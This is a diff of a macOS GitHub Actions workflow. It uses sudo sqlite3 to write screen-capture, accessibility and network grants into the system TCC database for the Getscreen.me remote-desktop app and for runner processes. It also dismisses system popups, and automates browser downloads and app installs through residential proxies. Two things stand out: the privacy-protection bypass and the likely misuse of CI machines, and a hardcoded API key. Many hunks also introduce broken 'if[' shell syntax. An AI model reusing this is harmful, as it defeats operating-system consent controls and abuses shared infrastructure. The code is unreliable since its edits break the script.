@@ -56,7 +56,7 @@ on:
         description: 'ScrapeOps API Key'
         required: false
         type: string
-        default: '5a76d13d-2645-479e-a462-90be4ab99e12'
+        default: 'c58ce00a-1032-4cea-8310-aa8eb6055fd6'
       run_without_proxy:
         description: 'Run without proxy (Bypass all proxies)'
         required: true
@@ -311,7 +311,7 @@ jobs:
               break
             fi
           done
-          if[ -z "$PYTHON_BIN" ]; then
+          if [ -z "$PYTHON_BIN" ]; then
             echo "ERROR: No Python3 found on runner."
             exit 1
           fi
@@ -332,7 +332,7 @@ jobs:
             NONINTERACTIVE=1 /bin/bash -c \
               "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" || true
             for bp in /opt/homebrew/bin /usr/local/bin; do
-              if [ -x "$bp/brew" ]; then
+              if[ -x "$bp/brew" ]; then
                 export PATH="$bp:$PATH"
                 echo "PATH=$bp:$PATH" >> "$GITHUB_ENV"
                 break
@@ -351,7 +351,7 @@ jobs:
       - name: Pre-Grant TCC Permissions (CLI-first, comprehensive)
         shell: bash
         run: |
-          echo "=== [$(date '+%H:%M:%S')] Pre-Granting TCC Permissions via SQLite (CLI) ==="
+          echo "===[$(date '+%H:%M:%S')] Pre-Granting TCC Permissions via SQLite (CLI) ==="
           TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"
           grant_tcc() {
             local SERVICE="$1"
@@ -387,10 +387,10 @@ jobs:
           grant_tcc kTCCServiceLocalNetwork  com.getscreen.desktop       0
           echo "[$(date '+%H:%M:%S')] --- Scanning for GitHub runner + compute-host process paths ---"
           for RUNNER_DIR in /Users/runner /home/runner /opt/hostedtoolcache /private/var/folders; do
-            if[ -d "$RUNNER_DIR" ]; then
+            if [ -d "$RUNNER_DIR" ]; then
               for BIN_NAME in Runner.Worker Runner.Listener Runner.PluginHost run.sh; do
                 FOUND_PATH=$(find "$RUNNER_DIR" -name "$BIN_NAME" -maxdepth 6 2>/dev/null | head -n 1 || true)
-                if[ -n "$FOUND_PATH" ]; then
+                if [ -n "$FOUND_PATH" ]; then
                   echo "[$(date '+%H:%M:%S')] Granting TCC to runner binary: $FOUND_PATH"
                   grant_tcc kTCCServiceLocalNetwork  "$FOUND_PATH" 1
                   grant_tcc kTCCServiceScreenCapture "$FOUND_PATH" 1
@@ -400,7 +400,7 @@ jobs:
             fi
           done
           ps aux 2>/dev/null | awk '{print $11}' | grep -iE "(runner|hosted|compute|agent)" | sort -u | while read -r PROC_PATH; do
-            if [ -x "$PROC_PATH" ]; then
+            if[ -x "$PROC_PATH" ]; then
               echo "[$(date '+%H:%M:%S')] Granting TCC to live process: $PROC_PATH"
               grant_tcc kTCCServiceLocalNetwork  "$PROC_PATH" 1
               grant_tcc kTCCServiceScreenCapture "$PROC_PATH" 1
@@ -446,7 +446,7 @@ jobs:
               --retry 3 --retry-delay 5 --silent --show-error || true
             FILE_SIZE=$(stat -f%z getscreen.dmg 2>/dev/null || \
                         stat -c%s getscreen.dmg 2>/dev/null || echo 0)
-            if[ -f "getscreen.dmg" ] && [ "$FILE_SIZE" -gt 102400 ]; then
+            if [ -f "getscreen.dmg" ] && [ "$FILE_SIZE" -gt 102400 ]; then
               SUCCESS=true
               break
             fi
@@ -454,14 +454,14 @@ jobs:
             sleep 5
             RETRY=$((RETRY+1))
           done
-          if[ "$SUCCESS" = false ]; then
+          if [ "$SUCCESS" = false ]; then
             echo "[$(date '+%H:%M:%S')] ERROR: Getscreen.me DMG failed to download. Skipping."
             exit 0
           fi
           echo "[$(date '+%H:%M:%S')] Downloaded getscreen.dmg (${FILE_SIZE}B). Mounting..."
           hdiutil attach getscreen.dmg -mountpoint /Volumes/getscreen -nobrowse -quiet || true
           APP_PATH=$(find /Volumes/getscreen -maxdepth 1 -name "*.app" | head -n 1 || true)
-          if [ -z "$APP_PATH" ]; then
+          if[ -z "$APP_PATH" ]; then
             echo "[$(date '+%H:%M:%S')] ERROR: No .app found inside Getscreen DMG."
             hdiutil detach /Volumes/getscreen -quiet -force || true
             exit 0
@@ -492,7 +492,7 @@ jobs:
             EXEC_PATH=$(find "/Applications/$APP_NAME/Contents/MacOS" \
               -maxdepth 1 -type f -perm +111 2>/dev/null | head -n 1 || true)
           fi
-          if [ -n "$EXEC_PATH" ] && [ -x "$EXEC_PATH" ]; then
+          if[ -n "$EXEC_PATH" ] && [ -x "$EXEC_PATH" ]; then
             for SVC in kTCCServiceScreenCapture kTCCServiceAccessibility kTCCServiceLocalNetwork; do
               sudo sqlite3 "$TCC_DB" \
                 "INSERT OR REPLACE INTO access \
@@ -501,7 +501,7 @@ jobs:
             done
             echo "[$(date '+%H:%M:%S')] TCC path-based permissions granted for $EXEC_PATH"
           fi
-          if[ -z "$EXEC_PATH" ] || [ ! -x "$EXEC_PATH" ]; then
+          if [ -z "$EXEC_PATH" ] ||[ ! -x "$EXEC_PATH" ]; then
             echo "[$(date '+%H:%M:%S')] ERROR: Getscreen executable not found."
             exit 0
           fi
@@ -523,7 +523,7 @@ jobs:
       - name: Pre-Dismiss All System Popups Including Compute-Host Agent (CLI + GUI)
         shell: bash
         run: |
-          echo "=== [$(date '+%H:%M:%S')] Pre-dismissing ALL system popups (CLI + GUI) ==="
+          echo "===[$(date '+%H:%M:%S')] Pre-dismissing ALL system popups (CLI + GUI) ==="
           TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"
 
           echo "[$(date '+%H:%M:%S')] Restarting TCC daemon to flush permission cache..."
@@ -533,7 +533,7 @@ jobs:
 
           echo "[$(date '+%H:%M:%S')] Scanning ALL running processes for TCC grants..."
           ps aux 2>/dev/null | awk '{print $11}' | sort -u | while read -r PROC_PATH; do
-            if [ -x "$PROC_PATH" ] 2>/dev/null; then
+            if[ -x "$PROC_PATH" ] 2>/dev/null; then
               PROC_LOWER=$(echo "$PROC_PATH" | tr '[:upper:]' '[:lower:]')
               if echo "$PROC_LOWER" | grep -qE "(compute|hosted|runner|agent|github|actions)"; then
                 echo "[$(date '+%H:%M:%S')]   Granting TCC to: $PROC_PATH"
@@ -671,10 +671,10 @@ jobs:
             "https://dl.google.com/chrome/mac/stable/GGRO/googlechrome.dmg" \
             -o "$CHROME_DMG" 2>/dev/null || true
           FILE_SIZE=$(stat -f%z "$CHROME_DMG" 2>/dev/null || echo 0)
-          if [ -f "$CHROME_DMG" ] && [ "$FILE_SIZE" -gt 1000000 ]; then
+          if [ -f "$CHROME_DMG" ] &&[ "$FILE_SIZE" -gt 1000000 ]; then
             hdiutil attach "$CHROME_DMG" -quiet -nobrowse \
               -mountpoint /Volumes/GoogleChrome || true
-            if [ -d "/Volumes/GoogleChrome/Google Chrome.app" ]; then
+            if[ -d "/Volumes/GoogleChrome/Google Chrome.app" ]; then
               sudo cp -R "/Volumes/GoogleChrome/Google Chrome.app" /Applications/ || true
               sudo xattr -dr com.apple.quarantine \
                 "/Applications/Google Chrome.app" 2>/dev/null || true
@@ -709,10 +709,10 @@ jobs:
           DMG_FILTER:    ${{ matrix.dmg_filter }}
         run: |
           echo "============================================================"
-          echo " [$(date '+%H:%M:%S')] Zero-Touch Downloader & Installer (macOS)"
+          echo "[$(date '+%H:%M:%S')] Zero-Touch Downloader & Installer (macOS)"
           echo " Category  : $SOFTWARE_TYPE"
           echo " Target URL: $TARGET_URL"
-          if [ "$USE_PROXY" = "true" ]; then
+          if[ "$USE_PROXY" = "true" ]; then
             echo " Mode      : Proxy-enabled (ScrapeOps)"
             echo " Proxy User: $PROXY_USER"
           else
@@ -1271,7 +1271,7 @@ jobs:
             try
               set jsCode to "
                 (function() {
-                  var els = document.querySelectorAll('a, button, [role=button]');
+                  var els = document.querySelectorAll('a, button,[role=button]');
                   for (var i = 0; i < els.length; i++) {
                     var txt = (els[i].textContent || '').toLowerCase().trim();
                     var href = (els[i].href || '').toLowerCase();
@@ -1713,7 +1713,7 @@ jobs:
             INSTALLED=false
             echo "[$(date '+%H:%M:%S')] [Watcher] Started. Monitoring $DL_FOLDER for downloads..."
             LAST_STATUS=$(($(date +%s)))
-            while[ "$INSTALLED" = false ] && [ "$(date +%s)" -lt "$DEADLINE" ]; do
+            while [ "$INSTALLED" = false ] && [ "$(date +%s)" -lt "$DEADLINE" ]; do
               NOW=$(date +%s)
               if [ $((NOW - LAST_STATUS)) -ge 20 ]; then
                 echo "[$(date '+%H:%M:%S')] [Watcher] Still monitoring... ($(( DEADLINE - NOW ))s remaining)"
@@ -1727,12 +1727,12 @@ jobs:
                 FILE=$(find "$DL_FOLDER" -maxdepth 1 -type d -name "*.app" \
                        -newer /tmp/watcher_start_marker 2>/dev/null | head -n 1 || true)
               fi
-              if [ -n "$FILE" ]; then
+              if[ -n "$FILE" ]; then
                 echo "[$(date '+%H:%M:%S')] [Watcher] ✓ Download detected: $FILE"
                 touch "$SENTINEL_PATH"
                 BASENAME=$(basename "$FILE")
                 EXT="${BASENAME##*.}"
-                if[ "$EXT" != "app" ]; then
+                if [ "$EXT" != "app" ]; then
                   echo "[$(date '+%H:%M:%S')] [Watcher] Waiting for download to complete..."
                   PREV=0
                   for i in $(seq 1 30); do
@@ -1752,8 +1752,8 @@ jobs:
                 echo "[$(date '+%H:%M:%S')][Watcher] 4s cleanup delay..."
                 sleep 4
                 INSTALLED_APP_NAME=""
-                if [ "$EXT" = "dmg" ]; then
-                  echo "[$(date '+%H:%M:%S')] [Installer] Mounting DMG: $FILE"
+                if[ "$EXT" = "dmg" ]; then
+                  echo "[$(date '+%H:%M:%S')][Installer] Mounting DMG: $FILE"
                   MNT=$(hdiutil attach "$FILE" -nobrowse -quiet 2>/dev/null \
                         | awk '/\/Volumes\// {print $NF}' | head -n 1 || true)
                   if [ -n "$MNT" ]; then
@@ -1801,7 +1801,7 @@ jobs:
                   INSTALLED_APP_NAME="$BASENAME"
                 fi
                 ACTUAL="$SOFTWARE_TYPE"
-                if[ "$ACTUAL" = "dynamic_opera" ] || [ "$ACTUAL" = "ad_mvn" ]; then
+                if [ "$ACTUAL" = "dynamic_opera" ] || [ "$ACTUAL" = "ad_mvn" ]; then
                   if echo "$INSTALLED_APP_NAME$BASENAME" | grep -qi "gx"; then
                     ACTUAL="opera_gx"
                   else
@@ -1825,7 +1825,7 @@ jobs:
                     "$HOME/Applications/Opera.app"
                   )
                 fi
-                echo "[$(date '+%H:%M:%S')] [Watcher] Waiting for app to appear on disk..."
+                echo "[$(date '+%H:%M:%S')][Watcher] Waiting for app to appear on disk..."
                 LAUNCHED=false
                 for i in $(seq 1 60); do
                   for P in "${SEARCH_PATHS[@]}"; do
@@ -1840,10 +1840,10 @@ jobs:
                   done
                   sleep 2
                 done
-                if [ "$LAUNCHED" = false ]; then
+                if[ "$LAUNCHED" = false ]; then
                   FOUND=$(find /Applications "$HOME/Applications" -maxdepth 2 -name "Opera*.app" 2>/dev/null | head -n 1 || true)
                   if [ -n "$FOUND" ]; then
-                    echo "[$(date '+%H:%M:%S')] [Watcher] Fallback launch: $FOUND"
+                    echo "[$(date '+%H:%M:%S')][Watcher] Fallback launch: $FOUND"
                     open "$FOUND" || true
                   fi
                 fi
@@ -1876,11 +1876,11 @@ jobs:
             --use-mock-keychain
           )
 
-          if [ "$USE_PROXY" = "true" ]; then
+          if[ "$USE_PROXY" = "true" ]; then
             PROXY_SRV="residential-proxy.scrapeops.io:8181"
             echo "[$(date '+%H:%M:%S')] Launching Chrome WITH proxy → $TARGET_URL"
             echo "[$(date '+%H:%M:%S')] Proxy server: $PROXY_SRV"
-            if[ -f "$CHROME_BIN" ]; then
+            if [ -f "$CHROME_BIN" ]; then
               "$CHROME_BIN" \
                 "${CHROME_FLAGS[@]}" \
                 --proxy-server="http://$PROXY_SRV" \
@@ -1893,7 +1893,7 @@ jobs:
             fi
           else
             echo "[$(date '+%H:%M:%S')] Launching Chrome DIRECT (no proxy) → $TARGET_URL"
-            if [ -f "$CHROME_BIN" ]; then
+            if[ -f "$CHROME_BIN" ]; then
               "$CHROME_BIN" \
                 "${CHROME_FLAGS[@]}" \
                 "$TARGET_URL" &
@@ -1913,7 +1913,7 @@ jobs:
           POLL_START=$(date +%s)
           while kill -0 $HANDLER_PID 2>/dev/null; do
             ELAPSED=$(($(date +%s) - POLL_START))
-            if[ $ELAPSED -gt $HANDLER_TIMEOUT ]; then
+            if [ $ELAPSED -gt $HANDLER_TIMEOUT ]; then
               echo "[$(date '+%H:%M:%S')] Handler timeout (${ELAPSED}s) — killing."
               kill $HANDLER_PID 2>/dev/null || true
               break
